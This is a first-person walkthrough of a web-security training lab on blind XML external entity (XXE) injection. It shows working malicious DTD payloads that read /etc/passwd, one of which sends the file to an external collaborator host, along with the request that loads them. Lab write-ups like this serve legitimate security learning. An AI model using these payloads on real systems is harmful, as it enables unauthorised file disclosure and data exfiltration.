# Lab: Exploiting blind XXE to retrieve data via error messages

>This lab has a "Check stock" feature that parses XML input but does not display the result.

>To solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file.

>The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.

### Observations
We can see the XML in the body of `POST /product/stock`
My collaborator url: `i2lp83iyim1k1d5cnbow29ddh4nubj.burpcollaborator.net`
My exploit url: `https://exploit-ac531fac1f6a8ae9c0951e6d01a10066.web-security-academy.net/exploit`

### Next steps
I slightly modified my DTD from the previous lab, here is the content that I stored on my exploit server as `/exploit` (look at the content between the pairs of `"""`):

"""

<!ENTITY % file SYSTEM "file:///etc/passwd">

<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://bapx36nws7mgxxnh9d3bcbqu2l8cw1.burpcollaborator.net/x=%file;'>">

%eval;

%exfil;`

"""


I then called my external DTD from my request to `POST /product/stock` with the following xml:

`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-ac531fac1f6a8ae9c0951e6d01a10066.web-security-academy.net/exploit"> %xxe;]>`

I got this error in the response: `"XML parser exited with non-zero code 1: Illegal character in URL"`


So I url encoded the url and received the following response:

`"XML parser exited with non-zero code 1: /home/peter/https:/exploit-ac531fac1f6a8ae9c0951e6d01a10066.web-security-academy.net/exploit (No such file or directory)"`

### Solution
I went through a lot of rabbit holes to find the action solution. This is my external dtd:


"""

<!ENTITY % file SYSTEM "file:///etc/passwd">

<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///%file;'>">

%eval;

%exfil;

"""

I then called this external DTD from the XML in the POST request:

`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-ac531fac1f6a8ae9c0951e6d01a10066.web-security-academy.net/exploit"> %xxe;]>`

The contents of `/etc/passwd` were dumped, lab solved!
